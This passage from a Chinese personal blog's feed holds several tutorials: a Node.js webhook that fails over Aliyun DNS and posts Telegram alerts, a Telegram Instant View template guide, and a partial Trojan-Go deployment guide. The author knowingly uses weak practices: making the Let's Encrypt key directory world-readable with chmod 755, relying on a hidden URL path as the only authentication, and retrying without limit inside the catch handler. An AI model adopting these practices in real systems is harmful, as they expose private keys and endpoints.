class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>)<br><span class="hljs-keyword">const</span> &#123;<span class="hljs-attr">default</span>: fetch&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;node-fetch-cjs&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Core</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@alicloud/pop-core&#x27;</span>);<br><br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dotenv&#x27;</span>).<span class="hljs-title function_">config</span>()<br><br><span class="hljs-keyword">let</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">formatDate</span> = (<span class="hljs-params">date</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(date)<br>    .<span class="hljs-title function_">toLocaleString</span>(<span class="hljs-string">&quot;zh&quot;</span>,&#123;<br>      <span class="hljs-attr">timeZone</span>: <span class="hljs-string">&quot;Asia/Shanghai&quot;</span>,<br>    &#125;)<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendTgMsg</span>(<span class="hljs-params">incident, result</span>) &#123;<br>  <span class="hljs-keyword">const</span> startedTime = (incident[<span class="hljs-string">&#x27;started_at&#x27;</span>]) ? <span class="hljs-string">`</span><br><span class="hljs-string">*开始时间：*<span class="hljs-subst">$&#123;formatDate(incident[<span class="hljs-string">&#x27;started_at&#x27;</span>])&#125;</span>`</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> acknowledgedTime = (incident[<span class="hljs-string">&#x27;acknowledged_at&#x27;</span>]) ? <span class="hljs-string">`</span><br><span class="hljs-string">*承认时间：*<span class="hljs-subst">$&#123;formatDate(incident[<span class="hljs-string">&#x27;acknowledged_at&#x27;</span>])&#125;</span>`</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> resolvedTime = (incident[<span class="hljs-string">&#x27;resolved_at&#x27;</span>]) ? <span class="hljs-string">`</span><br><span class="hljs-string">*解决时间：*<span class="hljs-subst">$&#123;formatDate(incident[<span class="hljs-string">&#x27;resolved_at&#x27;</span>])&#125;</span>`</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> status = (incident.<span class="hljs-property">status</span> === <span class="hljs-string">&#x27;started&#x27;</span>) ? <span class="hljs-string">&#x27;⚠️&#x27;</span> : ((incident.<span class="hljs-property">status</span> === <span class="hljs-string">&#x27;resolved&#x27;</span>) ? <span class="hljs-string">&#x27;✅&#x27;</span> : <span class="hljs-string">&#x27;☑️&#x27;</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.telegram.org/<span class="hljs-subst">$&#123;process.env.TELEGRAM_TOKEN&#125;</span>/sendMessage`</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>    <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span> &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>      <span class="hljs-string">&quot;disable_web_page_preview&quot;</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&quot;parse_mode&quot;</span>: <span class="hljs-string">&quot;Markdown&quot;</span>,<br>      <span class="hljs-string">&quot;chat_id&quot;</span>: <span class="hljs-number">968510652</span>,<br>      <span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">`*<span class="hljs-subst">$&#123;status&#125;</span> 监控到 杰出兽 服务状态变更*</span><br><span class="hljs-string"></span><br><span class="hljs-string">_<span class="hljs-subst">$&#123;incident.title&#125;</span>_：</span><br><span class="hljs-string">*状态：* <span class="hljs-subst">$&#123;incident.status&#125;</span><span class="hljs-subst">$&#123;startedTime&#125;</span><span class="hljs-subst">$&#123;acknowledgedTime&#125;</span><span class="hljs-subst">$&#123;resolvedTime&#125;</span></span><br><span class="hljs-string">*原因：*_<span class="hljs-subst">$&#123;incident.cause&#125;</span>_</span><br><span class="hljs-string">*详情：*<span class="hljs-subst">$&#123;incident[<span class="hljs-string">&#x27;incident_url&#x27;</span>]&#125;</span></span><br><span class="hljs-string">*DNS 处置：*<span class="hljs-subst">$&#123;result || <span class="hljs-string">&#x27;无&#x27;</span>&#125;</span></span><br><span class="hljs-string">`</span>&#125;)<br>  &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-title function_">async</span> (_error) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">sendTgMsg</span>(incident, result);<br>  &#125;);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">aliyunDnsRecordIds</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">request</span>(<span class="hljs-string">&#x27;DescribeDomainRecords&#x27;</span>, &#123;<br>      <span class="hljs-string">&quot;DomainName&quot;</span>: <span class="hljs-string">&quot;jiecs.top&quot;</span>,<br>      <span class="hljs-string">&quot;RRKeyWord&quot;</span>: <span class="hljs-string">&quot;www&quot;</span><br>  &#125;, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">formatParams</span>: <span class="hljs-literal">false</span><br>  &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error)<br>    <span class="hljs-keyword">return</span> [];<br>  &#125;);<br>  <span class="hljs-keyword">return</span> result.<span class="hljs-property">DomainRecords</span>.<span class="hljs-property">Record</span>;<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">aliyunDnsSwitch</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> records = <span class="hljs-keyword">await</span> <span class="hljs-title function_">aliyunDnsRecordIds</span>();<br>  <span class="hljs-keyword">const</span> results = [];<br>  <span class="hljs-keyword">const</span> replaced = records[<span class="hljs-number">0</span>].<span class="hljs-property">Value</span> === process.<span class="hljs-property">env</span>.<span class="hljs-property">ALIYUN_DNS_REPLACE_WITH</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> index <span class="hljs-keyword">in</span> records) &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">request</span>(<span class="hljs-string">&#x27;UpdateDomainRecord&#x27;</span>, &#123;<br>      <span class="hljs-string">&quot;RecordId&quot;</span>: records[index].<span class="hljs-property">RecordId</span>,<br>      <span class="hljs-string">&quot;Line&quot;</span>: records[index].<span class="hljs-property">Line</span>,<br>      <span class="hljs-string">&quot;RR&quot;</span>: <span class="hljs-string">&quot;www&quot;</span>,<br>      <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;CNAME&quot;</span>,<br>      <span class="hljs-string">&quot;Value&quot;</span>: (replaced) ?<br>        ((records[index].<span class="hljs-property">Line</span> === <span class="hljs-string">&#x27;default&#x27;</span>) ? <span class="hljs-string">&#x27;[DEFAULT_LINE_DNS_CNAME]&#x27;</span> : <span class="hljs-string">&#x27;[OTHER_LINES_DNS_CNAME]&#x27;</span>) :<br>          process.<span class="hljs-property">env</span>.<span class="hljs-property">ALIYUN_DNS_REPLACE_WITH</span><br>    &#125;, &#123;<br>      <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-attr">formatParams</span>: <span class="hljs-literal">false</span><br>    &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>      results.<span class="hljs-title function_">push</span>(error.<span class="hljs-property">data</span>.<span class="hljs-property">Message</span>);<br>    &#125;);<br>    (result) ? results.<span class="hljs-title function_">push</span>(result) : <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(results);<br>&#125;<br><br><span class="hljs-keyword">let</span> client;<br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/[API_PATH]&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Core</span>(&#123;<br>      <span class="hljs-attr">accessKeyId</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">ALIYUN_AK_ID</span>,<br>      <span class="hljs-attr">accessKeySecret</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">ALIYUN_AK_SECRET</span>,<br>      <span class="hljs-attr">endpoint</span>: <span class="hljs-string">&#x27;https://alidns.ap-southeast-1.aliyuncs.com&#x27;</span>,<br>      <span class="hljs-comment">// 新加坡服务器</span><br>      <span class="hljs-attr">apiVersion</span>: <span class="hljs-string">&#x27;2015-01-09&#x27;</span><br>    &#125;);<br>    <span class="hljs-keyword">const</span> incident = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">const</span> result = (incident.<span class="hljs-property">title</span> === <span class="hljs-string">&#x27;jiecs.top&#x27;</span> &amp;&amp;<br>        incident.<span class="hljs-property">status</span> === <span class="hljs-string">&#x27;started&#x27;</span>) ? <span class="hljs-keyword">await</span> <span class="hljs-title function_">aliyunDnsSwitch</span>() : <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sendTgMsg</span>(incident, result);<br>    res.<span class="hljs-title function_">json</span>(incident);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br><span class="hljs-comment">// 本地调试用</span><br><span class="hljs-keyword">const</span> port = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">debug</span>(<span class="hljs-string">&#x27;Server listening on port&#x27;</span>, port);<br>&#125;);<br></code></pre></td></tr></table></figure></details><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面代码我还加了个 Telegram 的通知，参考<a href="https://core.telegram.org/bots/api#sendmessage">文档</a></p><p>至于鉴权我直接用了一个较长和复杂的 <code>[API_PATH]</code>，毕竟个人博客用不上多么安全，再说 IFTTT 也没法进行一些复杂的处理</p><p>回顾一下，整个流程的部署都是零成本的。虽然各个平台间的数据交接增加了攻击面，但这也极大地减少了对单点异常造成的影响</p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
      <tag>云服务</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Telegram Instant View 即时预览适配</title>
    <link href="/archives/47708b20/"/>
    <url>/archives/47708b20/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>Telegram 提供有一个 <em>Instant View</em> 功能，会在支持的网站的链接预览下面显示一个 Instant View 的按钮，中文一般叫即时预览，就是这个</p><p><img src="https://cdn.jiecs.top/img/2022/10/Screenshot_2022-10-14-20-19-42-359_nekox.messenger.webp" alt="即时预览按钮"></p><p>点开之后能<strong>瞬间</strong>看到文章全部内容，没有任何等待，图片加载和格式也十分优雅。不需要跳转到浏览器，等待浏览器启动，再加载网页之类的，所有内容缓存在 Telegram 服务器上。体验连贯很多。只是浏览内容一定程度上也比打开网络更安全</p><p>如果格式不完整或需要进行互动比如点赞评论这种，用户也可以点菜单的“使用其它应用打开”直接跳转浏览器</p><p><img src="https://cdn.jiecs.top/img/2022/10/Screenshot_2022-10-14-20-26-15-058_nekox.messenger-edit.webp" alt="使用其它应用打开"></p><p>另外，在点入的正文中还能添加你的频道传送条</p><p><img src="https://cdn.jiecs.top/img/2022/10/Screenshot_2022-10-14-20-40-51-966_nekox.messenger-edit.webp" alt="加入 杰出兽的小宇宙 频道"></p><p>用户没有加入该频道时会显示蓝色的 <em>加入</em> 按钮，点进去直接跳转你的频道，能起到一定程度的引流作用</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>但实际上这个即时预览是需要开发者&#x2F;网站方主动适配的，官网的介绍在<a href="https://instantview.telegram.org/">此处</a>。不适配则只会读取 <code>meta</code> 标签中的一些内容显示一小段预览文本，没有“即时预览”按钮</p><p>而且你的适配不是对网站进行操作（比如像 PWA 一样加个 manifest），而是要在 Telegram 的后台管理界面上操作，整套后端代码也<strong>不是开源的</strong>。甚至就算你全做好了也没法让大家都用上你的配置，你只能在自己的频道或其它地方发 t.me 链接 <code>https://t.me/iv?url=https%3A%2F%2Fwww.jiecs.top&amp;rhash=abcdefg</code>。要想别人直接发你的网站链接就有即时预览<strong>要发起申请</strong>，但我估计短时间这玩意绝对申请不到的</p><p>另外，链接预览处图片<strong>不支持 Webp</strong>，虽然它 png、jpg 甚至视频都支持但就是不支持 Webp，直接不显示。即时预览里外都不支持 Webp，而且只要你文章里有任何一张它加载不出的图片就都没有即时预览按钮，Webp 如今作为已经广泛使用的高性能压缩格式这玩意不原生支持就很蛋疼（但本文会介绍解决办法）</p><h2 id="适配"><a href="#适配" class="headerlink" title="适配"></a>适配</h2><h3 id="添加模板"><a href="#添加模板" class="headerlink" title="添加模板"></a>添加模板</h3><p>但总之这玩意还是有用的，就算频道根本没人看自己看着也舒服，大大滴提升体验</p><p>这玩意的配置文件说是配置文件，实际上几乎就是一套高级编程语言，有常规的分支循环、变量、数据类型、输出，针对 DOM 元素支持 <code>append</code> <code>remove</code> 等操作，相当复杂。Telegram 官方提供了完整的配置编写<a href="https://instantview.telegram.org/docs">文档</a>和配置<a href="https://instantview.telegram.org/samples">演示</a></p><p>你要先到 <em>My Templates</em> 里输入自己的网站的链接创建模板和页面。这里注意链接要是你网站的任何一篇文章，可以选格式丰富的一篇，添加好之后之后是可以直接适配全部文章的</p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>这里提供一下我的配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~allowed_origin:</span> <span class="hljs-string">&quot;https://www.jiecs.top&quot;</span><br><span class="hljs-string">?path:</span> <span class="hljs-string">/archives/.+</span><br><span class="hljs-string">@replace(&quot;^https://cdn.jiecs.top&quot;,</span> <span class="hljs-string">&quot;https://images.weserv.nl/?output=png&amp;default=www.jiecs.top/img/loading.gif&amp;url=blog-cdn-jiesou.vercel.app&quot;</span><span class="hljs-string">):</span> <span class="hljs-string">//img[contains(@src,</span> <span class="hljs-string">&quot;.webp&quot;</span><span class="hljs-string">)]/@src</span><br><span class="hljs-string">@replace(&quot;^https://cdn.jiecs.top&quot;,</span> <span class="hljs-string">&quot;https://images.weserv.nl/?output=png&amp;url=blog-cdn-jiesou.vercel.app&quot;</span><span class="hljs-string">):</span> <span class="hljs-string">//meta[@property=&quot;og:image&quot;][contains(@content,</span> <span class="hljs-string">&quot;.webp&quot;</span><span class="hljs-string">)]/@content</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">//a[has-class(&quot;navbar-brand&quot;)]&gt;storng</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">&quot;Jiecs&quot;</span><br><span class="hljs-string">author_url:&quot;https://www.jiecs.top/about/&quot;</span><br><span class="hljs-attr">channel:</span> <span class="hljs-string">&quot;@jiecsChannel&quot;</span><br><span class="hljs-attr">body:</span> <span class="hljs-string">//div[has-class(&quot;markdown-body&quot;)]</span><br><span class="hljs-attr">cover:</span> <span class="hljs-string">//meta[@property=&quot;og:image&quot;]/@content</span><br></code></pre></td></tr></table></figure><h4 id="指定路径范围"><a href="#指定路径范围" class="headerlink" title="指定路径范围"></a>指定路径范围</h4><p>其中 <code>?path</code> 即对作用路径范围的限定</p><p><code>path</code> 后面是正则，例如我的文章链接是 <code>https://www.jiecs.top/archives/xxxx</code>，匹配它的正则就是 <code>/archives/.+</code>。<a href="https://instantview.telegram.org/docs#path">文档</a></p><p>你在模板上添加的页面链接与此处配置不相干，那个页面链接只是让你照着那个链接开发，不是限定只能应用于那个链接。添加不同的页面就是添加不同的配置，同一模板可以作用于不同页面，<code>rhash</code> 也是相同的</p><h4 id="关于前缀"><a href="#关于前缀" class="headerlink" title="关于前缀"></a>关于前缀</h4><p>然后 <code>~allowed_origin</code> 以波浪 <code>~</code> 开头，表示它是个选项（option）。有不加和 <code>$@~?!</code> 之类的前缀，<a href="https://instantview.telegram.org/docs#types-of-rules">文档</a>都有介绍，比如上面 <code>?path</code> 的问号即表示如果这个成立才执行下面的部分</p><p>至于 <code>allowed_origin</code> 的含义则很明显了，<a href="https://instantview.telegram.org/docs#supported-options">文档</a></p><h4 id="支持-Webp"><a href="#支持-Webp" class="headerlink" title="支持 Webp"></a>支持 Webp</h4><p>然后下面一大串以 <code>@replace</code> 开头的代码就是在解决上文提到的不支持 Webp 问题。<a href="https://images.weserv.nl/">https://images.weserv.nl</a> 是一个开源的图片代理镜像服务，它不仅能代理图片，还能调整大小、样式之类的，也能转换格式。直接访问链接有详细的文档和介绍，我用到了 <a href="https://images.weserv.nl/docs/format.html#output">output</a> 设置输出的格式，和 <a href="https://images.weserv.nl/docs/format.html#default-image">default</a> 设置当请求失败时返回的默认图片，防止因一张图片挂了，导致整篇文章都没有即时预览</p><p>还有它的 CDN 的 Cloudflare，虽然国内访问比较慢，但给 Telegram 的服务器肯定还是没问题的</p><p><code>@replace</code> 是 Telegram Instant View 提供的函数，<a href="https://instantview.telegram.org/docs#replace">文档</a>，我用它图片链接把开头的 <code>https://cdn.jiecs.top</code> 替换成 images.weserv.nl 的链接。这里还把域名换成了 <code>blog-cdn-jiesou.vercel.app</code>，和 <code>cdn.jiecs.top</code> 是一样的，就是不知道为啥 images.weserv.nl 请求不到我的 <code>cdn.jiecs.top</code></p><p>下面的 <code>img[contains(@src, &quot;.webp&quot;)]</code> 就是匹配所有 <code>src</code> 属性中包含 <code>.webp</code> 字符串的 <code>img</code> 元素（不用 <code>end-with</code> 是考虑到部分图片有 URL Query）。后面的 <code>/@src</code> 表示让 <code>@replace</code> 替换该元素的 <code>src</code> 属性</p><p>下面重复了一遍代码，用 <code>meta[@property=&quot;og:image&quot;]</code> 匹配替换封面图片，同理</p><h4 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h4><p>除此之外，<code>//</code> 双斜杠开头的是 XPath 查询符，可以用来指定标题等，这里 Telegram 对 XPath 进行了一些加强，<a href="https://instantview.telegram.org/docs#extended-xpath">文档</a>。比如 <a href="https://instantview.telegram.org/docs#has-class"><code>has-class</code></a> 会自动把 class 按空格分开（正常情况 XPath 是严格按照属性匹配的）。元素查询不支持 CSS 选择器</p><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>还有就是版本问题，正常情况应该要加个 <code>~version: &quot;2.1&quot;</code> 的，现在 2.1 是最新。但 2.0 开始把内部 <code>simplify</code> 函数<del>优化</del>了下，我的博客用上了就各种问题。反正不填版本默认 1.0 也能用</p><h3 id="在-Telegram-上查看"><a href="#在-Telegram-上查看" class="headerlink" title="在 Telegram 上查看"></a>在 Telegram 上查看</h3><p>最后，点击右上角 <em>VIEW IN TELEGRAM</em></p><p><img src="https://cdn.jiecs.top/img/2022/10/IMG_20221014_215658.webp" alt="编辑器概览"></p><p>会跳转到 Telegram 分享链接，分享到收藏夹提取出其中的 <code>rhash</code> 即可，链接就是 <code>https://t.me/iv?url=xxx&amp;rhash=xxx</code>，其中 url 需要全部 url 编码</p><h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p><img src="https://cdn.jiecs.top/img/2022/10/Screenshot_2022-10-14-22-07-32-014_nekox.messenger-edit.webp" alt="频道中的文章都能直接点开"></p><p>还有这里频道的同步要编码 URL，用<a href="https://www.jiecs.top/archives/abfb43e/">之前介绍的 IFTTT</a> 可能不行。我是用的 Cloudflare Workers，搭配我的 <a href="https://github.com/jiesou/Workers-RssTelegramForwarder">RssTelegramForwarder</a> 修改</p><p>我的频道在下方 Follow 页可以找到，就是简单的同步通知频道</p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>教程</tag>
      
      <tag>Telegram</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>部署 Trojan-Go + WS + Cloudflare 时遇到的坑</title>
    <link href="/archives/8ab5a33c/"/>
    <url>/archives/8ab5a33c/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 2022 年 9 月 30 日和 10 月 03 日，某墙发威。大量使用基于 TLS 的翻墙工具的服务器都遭到封锁。相关消息网上能搜到很多，我就不赘述了。</p><p>我的服务器不知道啥时候也被封了，但我好几天之后才发现。我本以为只是网络或服务器不稳定，再加上我还有很多机场，平时都是 Clash 无感翻墙。直到一次需要连接服务器 SSH 时才发现服务器连不上了，联系到最近墙发威的消息我尝试翻墙连接，能连上，就确定是被墙了。</p><p>之后我就想着给服务器上点高级的技术手段，网上一番查找，最后确定用 Trojan-Go。将搭建过程中遇到的各种问题总结成这篇文章。</p><p>本文不面向纯纯的小白，不会教你用啥一键脚本面板之类的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先下载 <a href="https://github.com/p4gefau1t/trojan-go">Trojan-Go</a> 可执行文件的位置要注意，放到 <code>/usr/local/bin</code> 方便之后直接套官方的 <code>trojan-go.service</code> Systemd 配置。<br>然后配置文件放到 <code>/etc/trojan-go/config.json</code> 同理</p><h3 id="SSL-证书"><a href="#SSL-证书" class="headerlink" title="SSL 证书"></a>SSL 证书</h3><p>Trojan 基于 TLS 加密，需要像部署 HTTPS 网站一样申请一个 SSL 证书</p><p>如果你只想用 Cloudflare，这时候就可以先去 Cloudflare 用自己的域名创建站点了，直接生成一个源服务器证书并放到 <code>/etc/trojan-go/cert.pem</code> 之类的位置。但我一开始是没想用 CDN 的，所以先弄个子域 DNS 记录添加你的服务器，一般 A 记录，服务器是 DDNS 就 CNAME。然后用 <a href="https://certbot.eff.org/">certbot</a> 生成免费 Let’s Encrypt 的证书。certbot 申请也是 Let’s Encrypt 官方推荐的，设置好后会自动更新。</p><p>其实现在申请证书已经很简单了，照着官网装好 certbot 之后直接运行 <code>certbot certonly</code> 就行，certonly 是让 certbot 不去尝试自动修改 nginx 之类的配置文件。</p><p>中间提示你选 standalone 还是 webroot，就是让你选验证方式。standalone 是让 certbot 自己开一个 web 服务，webroot 是让你指定一个目录，certbot 会在这个目录下放一个验证文件，然后让 Let’s Encrypt 的服务器去访问这个文件来验证你的域名。</p><p>如果失败就看错误提示，可能是端口被占用，或者服务器 80 端口没开。申请时需要一个文件验证你对域名的所有权，所以要开 80。</p><p>生成的证书在 <code>/etc/letsencrypt/live/[域名]/[fullchain.pem/privkey.pem]</code> 下。这里有第一个坑，导致后面问题一直排除不出，当时我甚至以为是 Trojan 问题。<br><code>/etc</code> 目录默认是需要 root 的，所以直接用就 permission denied。图省事一般就 <code>chmod 755 /etc/letsencrypt</code>，虽然不是很安全，但是我只是自己用，就这样了。</p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>配置文件其实反而是最简单的，照着示例改就行了，主要是改密码和证书路径，还有把绕过中国的部分删了。<a href="https://p4gefau1t.github.io/trojan-go/basic/full-config/">完整文档</a></p><p><code>remote_addr</code> 和 <code>remote_port</code> 需要你服务器开个 HTTP 的 Web 服务。如果你不想用真的 Nginx，也可以用 Python 的 Flask 之类的搭个简单的站点。</p><p>其中 <code>sni</code> 就填你申请了证书的域名，不填默认用 <code>remote_addr</code>。端口就默认的 443，这也是 HTTPS 的端口，不要瞎几把改，除非你知道你在做什么。证书路径就是 cert 的路径，上文有写，后缀&#x2F;扩展名和示例不一样不用管，pem 就可以的，里面本质就是一串字符串，扩展名改成啥都行。</p><p>我一开始先没配置 WebSocket 部分，这边也建议先尝试成功了再改。</p><h3 id="Systemd-配置"><a href="#Systemd-配置" class="headerlink" title="Systemd 配置"></a>Systemd 配置</h3><p>systemd 是 linux 的一个进程管理工具，能在失去 ssh 连接后仍保持进程运行，还能开机自启查看日志之类的。</p><p>你会发现官方的 systemd 配置文件模板有两个，<code>trojan-go.service</code> 和 <code>trojan-go@.service</code>，其中带 @ 的把 ExecStart 命令中配置文件的名字换成了 %i。这是 systemd 的特性，可以很方便的管理多个配置文件。如 trojan-go@aaa 即使用 aaa.json 作为配置文件。但一般个人用不上就不用管了，只用不带 @ 的。放到 <code>/etc/systemd/system/trojan-go.service</code> 或者相应位置。</p><p>另外这里你还会发现官方模板里可执行文件和配置文件的位置是在 <code>/usr/bin/trojan-go</code> 和 <code>/etc/trojan-go/config.json</code>，注意把文件放到对应位置或者改下。</p><p>还有配置文件中 <code>User=nobody</code> 其实是不安全的，现在一般建议改成 <code>DynamicUser=true</code>。</p><p>添加好就可以 <code>systemctl start trojan-go</code> 了，用 <code>systemctl status trojan-go</code> 查看状态，<code>journalctl -u trojan-go</code> 查看完整日志。如果一切顺利就可以用你喜欢的客户端连了。这里附上 <a href="https://docs.metacubex.one/example/ex1">Clash Meta 的文档</a>。日志正常但连不上还是注意看下服务器 443 端口开没开。注意 <code>server</code> 或者其它客户端对应字段要填你的域名，<strong>不能是 IP 或 DDNS 域名</strong>，除非你后续不想用 Cloudflare。</p><p>这里的坑只要你照着上面的步骤一步步来就<strong>不会遇到</strong>，但我还是讲下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE<br>AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE<br></code></pre></td></tr></table></figure><p>配置文件里上面这些东西是在给进程授予 <code>CAP_NET_ADMIN</code>、<code>CAP_NET_BIND_SERVICE</code> 特权，并剔除掉<strong>除了这两个之外的</strong>其它特权。</p><p>但我一开始看到<a href="https://unix.stackexchange.com/questions/580597/what-is-the-difference-between-ambientcapabilities-and-capabilityboundingset">这篇文章</a>，因为他表达的不是很清楚，以为一个是给予一个是拒绝互相冲突，所以就把 <code>CapabilityBoundingSet</code> 删了。结果发现真启动了，我就认定了<code>CapabilityBoundingSet</code> 是剔除掉<strong>设置的</strong>特权。但实际上这里因为 <code>CapabilityBoundingSet</code> 把 root 访问前述 <code>/etc/letsencrypt</code> 目录的权限给剔除了，即使你设了 <code>User=root</code> 也没法访问。我把这个删了，自然也就允许 root 访问了。我之后尝试不把用户设成 root，结果失败了，我当时也没仔细看过日志。</p><p>总之，记住 <code>CapabilityBoundingSet</code> 是<strong>剔除</strong>掉<strong>除了设置之外的</strong>特权，<code>AmbientCapabilities</code> 